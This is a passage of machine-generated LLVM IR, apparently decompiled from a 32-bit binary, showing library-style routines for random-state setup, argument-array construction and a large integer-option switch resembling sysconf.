  br i1 %v1_80507f4, label %dec_label_pc_80507e6, label %dec_label_pc_80507f6

dec_label_pc_80507f6:                             ; preds = %dec_label_pc_80507e6, %dec_label_pc_80507d5, %dec_label_pc_805078f
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80507f8

dec_label_pc_80507f8:                             ; preds = %dec_label_pc_805076c, %dec_label_pc_80507f6
  %v0_80507fb = phi i32 [ -1, %dec_label_pc_805076c ], [ 0, %dec_label_pc_80507f6 ]
  store i32 %v0_80507fb, i32* %eax.global-to-local, align 4
  store i32 %v0_805076f, i32* @ebx, align 4
  store i32 %v0_805076e, i32* @esi, align 4
  store i32 %v0_805076d, i32* @edi, align 4
  store i32 %v0_805076c, i32* @ebp, align 4
  ret i32 %v0_80507fb

; uselistorder directives
  uselistorder i32 %v0_80507fb, { 1, 0 }
  uselistorder i32 %v1_80507f3, { 1, 0 }
  uselistorder i32 %v0_80507d5, { 1, 0 }
  uselistorder i32 %v0_80507d0, { 1, 0 }
  uselistorder i32 %v2_80507c0.v1_80507c4, { 1, 0 }
  uselistorder i32 %v0_80507a6, { 1, 0 }
  uselistorder i32 %v0_8050797, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80507f8, { 1, 0 }
  uselistorder label %dec_label_pc_80507e6, { 1, 0 }
  uselistorder label %dec_label_pc_80507a6, { 1, 0 }
  uselistorder label %dec_label_pc_805078f, { 1, 0 }
}

define i32 @function_8050802(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050802:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8050805 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8050826, label %dec_label_pc_805081a

dec_label_pc_805081a:                             ; preds = %dec_label_pc_8050802
  %v2_805081a = icmp ult i32 %arg3, 256
  %v1_8050821 = select i1 %v2_805081a, i32 5, i32 4
  store i32 %v1_8050821, i32* @ebx, align 4
  br label %dec_label_pc_805083c

dec_label_pc_8050826:                             ; preds = %dec_label_pc_8050802
  %v6_8050829 = icmp ugt i32 %arg3, 31
  br i1 %v6_8050829, label %dec_label_pc_8050834, label %dec_label_pc_805082b

dec_label_pc_805082b:                             ; preds = %dec_label_pc_8050826
  store i32 0, i32* @ebx, align 4
  %v6_8050830 = icmp ugt i32 %arg3, 7
  br i1 %v6_8050830, label %dec_label_pc_805083c, label %dec_label_pc_805088c

dec_label_pc_8050834:                             ; preds = %dec_label_pc_8050826
  %v2_8050834 = icmp ult i32 %arg3, 64
  %v1_8050839 = select i1 %v2_8050834, i32 3, i32 2
  store i32 %v1_8050839, i32* @ebx, align 4
  br label %dec_label_pc_805083c

dec_label_pc_805083c:                             ; preds = %dec_label_pc_805082b, %dec_label_pc_805081a, %dec_label_pc_8050834
  %v0_805083c = phi i32 [ 0, %dec_label_pc_805082b ], [ %v1_8050821, %dec_label_pc_805081a ], [ %v1_8050839, %dec_label_pc_8050834 ]
  %v1_805083c = mul nuw nsw i32 %v0_805083c, 4
  %v2_805083c = add i32 %v1_805083c, ptrtoint (i32* @global_var_8053db4.82 to i32)
  %v3_805083c = inttoptr i32 %v2_805083c to i32*
  %v4_805083c = load i32, i32* %v3_805083c, align 4
  store i32 %v4_805083c, i32* %eax.global-to-local, align 4
  %v1_8050843 = add i32 %tmp7, 4
  store i32 %v1_8050843, i32* @esi, align 4
  %v2_8050846 = add i32 %arg4, 16
  %v3_8050846 = inttoptr i32 %v2_8050846 to i32*
  store i32 %v4_805083c, i32* %v3_8050846, align 4
  %v0_8050849 = load i32, i32* @ebx, align 4
  %v1_8050849 = mul i32 %v0_8050849, 4
  %v2_8050849 = add i32 %v1_8050849, ptrtoint (i32* @global_var_8053da0.83 to i32)
  %v3_8050849 = inttoptr i32 %v2_8050849 to i32*
  %v4_8050849 = load i32, i32* %v3_8050849, align 4
  store i32 %v4_8050849, i32* %edx.global-to-local, align 4
  %v0_8050850 = load i32, i32* @esi, align 4
  %v1_8050850 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050850 = mul i32 %v1_8050850, 4
  %v3_8050850 = add i32 %v2_8050850, %v0_8050850
  store i32 %v3_8050850, i32* %eax.global-to-local, align 4
  %v1_8050853 = load i32, i32* @edi, align 4
  %v2_8050853 = add i32 %v1_8050853, 12
  %v3_8050853 = inttoptr i32 %v2_8050853 to i32*
  store i32 %v0_8050849, i32* %v3_8050853, align 4
  %v0_8050856 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050856 = load i32, i32* @edi, align 4
  %v2_8050856 = add i32 %v1_8050856, 20
  %v3_8050856 = inttoptr i32 %v2_8050856 to i32*
  store i32 %v0_8050856, i32* %v3_8050856, align 4
  %v0_8050859 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050859 = load i32, i32* @edi, align 4
  %v2_8050859 = add i32 %v1_8050859, 24
  %v3_8050859 = inttoptr i32 %v2_8050859 to i32*
  store i32 %v0_8050859, i32* %v3_8050859, align 4
  %v0_805085c = load i32, i32* @esi, align 4
  %v1_805085c = load i32, i32* @edi, align 4
  %v2_805085c = add i32 %v1_805085c, 8
  %v3_805085c = inttoptr i32 %v2_805085c to i32*
  store i32 %v0_805085c, i32* %v3_805085c, align 4
  %v0_805085f = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8050864 = sext i32 %arg1 to i64
  %v3_8050864 = call i32 @function_805076c(i64 %v2_8050864, i32 %v0_805085f)
  %v0_8050869 = load i32, i32* @ebp, align 4
  %v1_8050869 = inttoptr i32 %v0_8050869 to i32*
  store i32 0, i32* %v1_8050869, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050874 = load i32, i32* @ebx, align 4
  %v1_8050874 = icmp eq i32 %v0_8050874, 0
  br i1 %v1_8050874, label %dec_label_pc_80508a5, label %dec_label_pc_8050878

dec_label_pc_8050878:                             ; preds = %dec_label_pc_805083c
  %v0_8050878 = load i32, i32* @edi, align 4
  %v1_8050878 = add i32 %v0_8050878, 4
  %v2_8050878 = inttoptr i32 %v1_8050878 to i32*
  %v3_8050878 = load i32, i32* %v2_8050878, align 4
  %v1_805087b = load i32, i32* @esi, align 4
  %v2_805087b = sub i32 %v3_8050878, %v1_805087b
  %v2_805087d = sdiv i32 %v2_805087b, 4
  %v3_8050880 = mul i32 %v2_805087d, 5
  %v2_8050883 = add i32 %v3_8050880, %v0_8050874
  %v1_8050885 = load i32, i32* @ebp, align 4
  %v2_8050885 = inttoptr i32 %v1_8050885 to i32*
  store i32 %v2_8050883, i32* %v2_8050885, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508a5

dec_label_pc_805088c:                             ; preds = %dec_label_pc_805082b
  %v1_805088c = call i32 @function_804e1ec(i32 %v0_8050805)
  store i32 %v1_805088c, i32* %eax.global-to-local, align 4
  %v1_8050891 = inttoptr i32 %v1_805088c to i32*
  store i32 22, i32* %v1_8050891, align 4
  %v0_8050897 = load i32, i32* %stack_var_-36, align 4
  %v1_8050897 = call i32 @function_804e1ec(i32 %v0_8050897)
  %v1_805089c = inttoptr i32 %v1_8050897 to i32*
  store i32 22, i32* %v1_805089c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508a5

dec_label_pc_80508a5:                             ; preds = %dec_label_pc_805083c, %dec_label_pc_8050878, %dec_label_pc_805088c
  %v0_80508ac = phi i32 [ 0, %dec_label_pc_805083c ], [ 0, %dec_label_pc_8050878 ], [ -1, %dec_label_pc_805088c ]
  ret i32 %v0_80508ac

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i64, i32)* @function_805076c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80508a5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805083c, { 2, 0, 1 }
}

define i32 @function_80509f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80509f8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8050a0b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050a0b, i32* @ebx, align 4
  %v2_8050a10 = call i32 @function_8050de2(i32 %v2_8050a0b, i32 134548959)
  %v1_8050a1c = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_80553e0.84 to i32))
  %v0_8050a21 = load i32, i32* @global_var_805b478.85, align 8
  store i32 %v0_8050a21, i32* @eax, align 4
  %v1_8050a29 = icmp eq i32 %v0_8050a21, 0
  br i1 %v1_8050a29, label %dec_label_pc_8050a36, label %dec_label_pc_8050a2d

dec_label_pc_8050a2d:                             ; preds = %dec_label_pc_80509f8
  %v0_8050a30 = load i32, i32* @esi, align 4
  %v1_8050a31 = call i32 @unknown_0(i32 %v0_8050a30)
  store i32 %v1_8050a31, i32* @eax, align 4
  br label %dec_label_pc_8050a36

dec_label_pc_8050a36:                             ; preds = %dec_label_pc_80509f8, %dec_label_pc_8050a2d
  %v2_8050a3b = call i32 @function_8050de2(i32 %v2_8050a0b, i32 1)
  %v0_8050a40 = call i32 @function_8050da0()
  %v0_8050a51 = call i32 @function_804e308()
  %v0_8050a59 = load i32, i32* @esi, align 4
  %v1_8050a5a = call i32 @function_804ddcc(i32 %v0_8050a59)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_804ddcc, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8050ddf, { 3, 10, 9, 8, 7, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 (i32, i32)* @function_8050de2, { 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8050a36, { 1, 0 }
}

define i32 @function_8050a60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8050a60:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8050a67 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8050a67, i32* %eax.global-to-local, align 4
  %v12_8050a6a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8050a70

dec_label_pc_8050a70:                             ; preds = %dec_label_pc_8050a70, %dec_label_pc_8050a60
  %v0_8050a73 = phi i32 [ 0, %dec_label_pc_8050a60 ], [ %v1_8050a73, %dec_label_pc_8050a70 ]
  %stack_var_-16.0 = phi i32 [ %v2_8050a67, %dec_label_pc_8050a60 ], [ %v1_8050a74, %dec_label_pc_8050a70 ]
  %v1_8050a73 = add i32 %v0_8050a73, 1
  store i32 %v1_8050a73, i32* %esi.global-to-local, align 4
  %v1_8050a74 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8050a74, i32* %eax.global-to-local, align 4
  %v1_8050a7a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8050a7a = load i32, i32* %v1_8050a7a, align 4
  %v3_8050a7a = icmp eq i32 %v2_8050a7a, 0
  %v1_8050a7d = icmp eq i1 %v3_8050a7a, false
  br i1 %v1_8050a7d, label %dec_label_pc_8050a70, label %dec_label_pc_8050a7f

dec_label_pc_8050a7f:                             ; preds = %dec_label_pc_8050a70
  %v1_8050a7f = mul i32 %v1_8050a73, 4
  %v2_8050a7f = add i32 %v1_8050a7f, 34
  %v1_8050a86 = and i32 %v2_8050a7f, -16
  %v2_8050a89 = sub i32 %v12_8050a6a, %v1_8050a86
  %v1_8050a8e = add i32 %v2_8050a89, 15
  %v1_8050a92 = and i32 %v1_8050a8e, -16
  store i32 %v1_8050a92, i32* @ebx, align 4
  store i32 %v1_8050a92, i32* %ecx.global-to-local, align 4
  %v2_8050a97 = inttoptr i32 %v1_8050a92 to i32*
  store i32 %arg2, i32* %v2_8050a97, align 16
  store i32 %v2_8050a67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a9f

dec_label_pc_8050a9f:                             ; preds = %dec_label_pc_8050a9f, %dec_label_pc_8050a7f
  %stack_var_-16.1 = phi i32 [ %v2_8050a67, %dec_label_pc_8050a7f ], [ %v1_8050aa6, %dec_label_pc_8050a9f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8050aa2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050aa2 = add i32 %v0_8050aa2, 4
  store i32 %v1_8050aa2, i32* %ecx.global-to-local, align 4
  %v0_8050aa5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050aa5 = add i32 %v0_8050aa5, -1
  %v8_8050aa5 = icmp eq i32 %v1_8050aa5, 0
  store i32 %v1_8050aa5, i32* %esi.global-to-local, align 4
  %v1_8050aa6 = add i32 %stack_var_-16.1, 4
  %v1_8050aac = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8050aac = load i32, i32* %v1_8050aac, align 4
  store i32 %v2_8050aac, i32* %eax.global-to-local, align 4
  %v2_8050aae = inttoptr i32 %v1_8050aa2 to i32*
  store i32 %v2_8050aac, i32* %v2_8050aae, align 4
  %v1_8050ab0 = icmp eq i1 %v8_8050aa5, false
  br i1 %v1_8050ab0, label %dec_label_pc_8050a9f, label %dec_label_pc_8050ab2

dec_label_pc_8050ab2:                             ; preds = %dec_label_pc_8050a9f
  %v0_8050ab2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ab2 = load i32, i32* @esp, align 4
  %v2_8050ab2 = add i32 %v1_8050ab2, -4
  %v3_8050ab2 = inttoptr i32 %v2_8050ab2 to i32*
  store i32 %v0_8050ab2, i32* %v3_8050ab2, align 4
  %v0_8050ab3 = load i32, i32* @global_var_805b480.86, align 128
  %v2_8050ab3 = add i32 %v1_8050ab2, -8
  %v3_8050ab3 = inttoptr i32 %v2_8050ab3 to i32*
  store i32 %v0_8050ab3, i32* %v3_8050ab3, align 4
  %v0_8050ab9 = load i32, i32* @ebx, align 4
  %v2_8050ab9 = add i32 %v1_8050ab2, -12
  %v3_8050ab9 = inttoptr i32 %v2_8050ab9 to i32*
  store i32 %v0_8050ab9, i32* %v3_8050ab9, align 4
  %v5_8050aba = add i32 %v1_8050ab2, -16
  %v6_8050aba = inttoptr i32 %v5_8050aba to i32*
  store i32 %arg1, i32* %v6_8050aba, align 4
  %v1_8050abd = inttoptr i32 %v1_8050aa6 to i8*
  %v2_8050abd = call i32 @function_80511d0(i8* %v1_8050abd)
  store i32 %v2_8050abd, i32* %eax.global-to-local, align 4
  ret i32 %v2_8050abd

; uselistorder directives
  uselistorder i32 %v1_8050aa5, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8050a74, { 1, 0 }
  uselistorder i32 %v1_8050a73, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8050a67, { 0, 2, 1, 3 }
  uselistorder i32 -12, { 1, 28, 29, 19, 20, 16, 17, 18, 13, 0, 14, 15, 12, 9, 10, 11, 8, 6, 7, 5, 3, 4, 2, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 -8, { 1, 25, 26, 27, 17, 18, 14, 15, 16, 12, 0, 13, 11, 9, 10, 8, 6, 7, 5, 3, 4, 2, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* @esp, { 65, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 2, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64 }
  uselistorder i32 -16, { 2, 42, 43, 32, 33, 34, 29, 30, 31, 24, 25, 26, 27, 28, 23, 18, 19, 20, 21, 22, 17, 13, 14, 15, 16, 10, 9, 11, 12, 5, 6, 7, 8, 3, 4, 0, 1, 35, 36, 37, 38, 39, 40, 41 }
}

define i32 @function_8050c58(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050c58:
  switch i32 %arg1, label %dec_label_pc_8050c77 [
    i32 0, label %dec_label_pc_8050c87
    i32 1, label %dec_label_pc_8050d6c
    i32 2, label %dec_label_pc_8050c91
    i32 3, label %dec_label_pc_8050c9b
    i32 4, label %dec_label_pc_8050ca5
    i32 5, label %dec_label_pc_8050d3b
    i32 6, label %dec_label_pc_8050cad
    i32 7, label %dec_label_pc_8050c6d
    i32 8, label %dec_label_pc_8050c6d
    i32 9, label %dec_label_pc_8050c6d
    i32 10, label %dec_label_pc_8050c6d
    i32 11, label %dec_label_pc_8050c6d
    i32 12, label %dec_label_pc_8050c6d
    i32 13, label %dec_label_pc_8050c6d
    i32 14, label %dec_label_pc_8050c6d
    i32 15, label %dec_label_pc_8050c6d
    i32 16, label %dec_label_pc_8050c6d
    i32 17, label %dec_label_pc_8050c6d
    i32 18, label %dec_label_pc_8050c6d
    i32 19, label %dec_label_pc_8050c6d
    i32 20, label %dec_label_pc_8050c6d
    i32 21, label %dec_label_pc_8050c6d
    i32 22, label %dec_label_pc_8050c6d
    i32 23, label %dec_label_pc_8050d6c
    i32 24, label %dec_label_pc_8050d6c
    i32 25, label %dec_label_pc_8050d78
    i32 26, label %dec_label_pc_8050d49
    i32 27, label %dec_label_pc_8050d6c
    i32 28, label %dec_label_pc_8050cbf
    i32 29, label %dec_label_pc_8050d42
    i32 30, label %dec_label_pc_8050cb7
    i32 31, label %dec_label_pc_8050d57
    i32 32, label %dec_label_pc_8050d6c
    i32 33, label %dec_label_pc_8050d6c
    i32 34, label %dec_label_pc_8050d6c
    i32 35, label %dec_label_pc_8050d50
    i32 36, label %dec_label_pc_8050d7f
    i32 37, label %dec_label_pc_8050d86
    i32 38, label %dec_label_pc_8050d7f
    i32 39, label %dec_label_pc_8050cc9
    i32 40, label %dec_label_pc_8050d8d
    i32 41, label %dec_label_pc_8050d6c
    i32 42, label %dec_label_pc_8050d57
    i32 43, label %dec_label_pc_8050d86
    i32 44, label %dec_label_pc_8050d94
    i32 45, label %dec_label_pc_8050d86
    i32 46, label %dec_label_pc_8050d42
    i32 47, label %dec_label_pc_8050d42
    i32 48, label %dec_label_pc_8050d42
    i32 49, label %dec_label_pc_8050d6c
    i32 50, label %dec_label_pc_8050d6c
    i32 51, label %dec_label_pc_8050d42
    i32 52, label %dec_label_pc_8050d42
    i32 53, label %dec_label_pc_8050d6c
    i32 54, label %dec_label_pc_8050d6c
    i32 55, label %dec_label_pc_8050d6c
    i32 56, label %dec_label_pc_8050d6c
    i32 57, label %dec_label_pc_8050d6c
    i32 58, label %dec_label_pc_8050d6c
    i32 59, label %dec_label_pc_8050d6c
    i32 60, label %dec_label_pc_8050d6c
    i32 61, label %dec_label_pc_8050d6c
    i32 62, label %dec_label_pc_8050d6c
    i32 63, label %dec_label_pc_8050d6c
    i32 64, label %dec_label_pc_8050d6c
    i32 65, label %dec_label_pc_8050d6c
    i32 66, label %dec_label_pc_8050d6c
    i32 67, label %dec_label_pc_8050c6d
    i32 68, label %dec_label_pc_8050c6d
    i32 69, label %dec_label_pc_8050d50
    i32 70, label %dec_label_pc_8050d50
    i32 71, label %dec_label_pc_8050d50
    i32 72, label %dec_label_pc_8050d57
    i32 73, label %dec_label_pc_8050d5e
    i32 74, label %dec_label_pc_8050d65
    i32 75, label %dec_label_pc_8050cd3
    i32 76, label %dec_label_pc_8050d65
    i32 77, label %dec_label_pc_8050c6d
    i32 78, label %dec_label_pc_8050c6d
    i32 79, label %dec_label_pc_8050c6d
    i32 80, label %dec_label_pc_8050c6d
    i32 81, label %dec_label_pc_8050c6d
    i32 82, label %dec_label_pc_8050c6d
    i32 83, label %dec_label_pc_8050c6d
    i32 84, label %dec_label_pc_8050c6d
    i32 85, label %dec_label_pc_8050d6c
    i32 86, label %dec_label_pc_8050d6c
    i32 87, label %dec_label_pc_8050d49
    i32 88, label %dec_label_pc_8050cdd
    i32 89, label %dec_label_pc_8050ce7
    i32 90, label %dec_label_pc_8050d5e
    i32 91, label %dec_label_pc_8050c6d
    i32 92, label %dec_label_pc_8050c6d
    i32 93, label %dec_label_pc_8050c6d
    i32 94, label %dec_label_pc_8050c6d
    i32 95, label %dec_label_pc_8050d42
    i32 96, label %dec_label_pc_8050d6c
    i32 97, label %dec_label_pc_8050d6c
    i32 98, label %dec_label_pc_8050c6d
    i32 99, label %dec_label_pc_8050c6d
    i32 100, label %dec_label_pc_8050c6d
    i32 101, label %dec_label_pc_8050cf1
    i32 102, label %dec_label_pc_8050d34
    i32 103, label %dec_label_pc_8050d71
    i32 104, label %dec_label_pc_8050d49
    i32 105, label %dec_label_pc_8050cfb
    i32 106, label %dec_label_pc_8050d57
    i32 107, label %dec_label_pc_8050d57
    i32 108, label %dec_label_pc_8050d3b
    i32 109, label %dec_label_pc_8050d78
    i32 110, label %dec_label_pc_8050d94
    i32 111, label %dec_label_pc_8050d34
    i32 112, label %dec_label_pc_8050d71
    i32 113, label %dec_label_pc_8050d94
    i32 114, label %dec_label_pc_8050d05
    i32 115, label %dec_label_pc_8050d8d
    i32 116, label %dec_label_pc_8050d6c
    i32 117, label %dec_label_pc_8050d6c
    i32 118, label %dec_label_pc_8050d0f
    i32 119, label %dec_label_pc_8050d19
    i32 120, label %dec_label_pc_8050d86
    i32 121, label %dec_label_pc_8050d49
    i32 122, label %dec_label_pc_8050d49
    i32 123, label %dec_label_pc_8050d49
    i32 124, label %dec_label_pc_8050d49
    i32 125, label %dec_label_pc_8050c6d
    i32 126, label %dec_label_pc_8050c6d
    i32 127, label %dec_label_pc_8050d6c
    i32 128, label %dec_label_pc_8050d6c
    i32 129, label %dec_label_pc_8050c6d
    i32 130, label %dec_label_pc_8050c6d
    i32 131, label %dec_label_pc_8050d6c
    i32 149, label %dec_label_pc_8050d20
  ]

dec_label_pc_8050c6d:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050c77:                             ; preds = %dec_label_pc_8050c58
  %v1_8050c77 = call i32 @function_804e1ec(i32 ptrtoint (i32* @0 to i32))
  %v1_8050c7c = inttoptr i32 %v1_8050c77 to i32*
  store i32 22, i32* %v1_8050c7c, align 4
  br label %dec_label_pc_8050d6c

dec_label_pc_8050c87:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050c91:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050c9b:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050ca5:                             ; preds = %dec_label_pc_8050c58
  %v3_8050ca8 = call i32 @function_804deb0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8050cad

dec_label_pc_8050cad:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050ca5
  br label %dec_label_pc_8050d99

dec_label_pc_8050cb7:                             ; preds = %dec_label_pc_8050c58
  %v0_8050cba = call i32 @function_8051280()
  br label %dec_label_pc_8050cbf

dec_label_pc_8050cbf:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050cb7
  br label %dec_label_pc_8050d99

dec_label_pc_8050cc9:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050cd3:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050cdd:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050ce7:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050cf1:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050cfb:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d05:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d0f:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d19:                             ; preds = %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d20:                             ; preds = %dec_label_pc_8050c58
  %v5_8050d26 = call i32 @function_805119c(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8050d2e = icmp slt i32 %v5_8050d26, 0
  %v1_8050d30 = icmp eq i1 %v2_8050d2e, false
  br i1 %v1_8050d30, label %dec_label_pc_8050d42, label %dec_label_pc_8050d6c

dec_label_pc_8050d34:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d3b:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d42:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050d20
  br label %dec_label_pc_8050d99

dec_label_pc_8050d49:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d50:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d57:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d5e:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d65:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d6c:                             ; preds = %dec_label_pc_8050d20, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c77
  br label %dec_label_pc_8050d99

dec_label_pc_8050d71:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d78:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d7f:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d86:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58, %dec_label_pc_8050c58
  br label %dec_label_pc_8050d99

dec_label_pc_8050d8d:                             ; preds = %dec_label_pc_8050c58, %dec_label_pc_8050c58
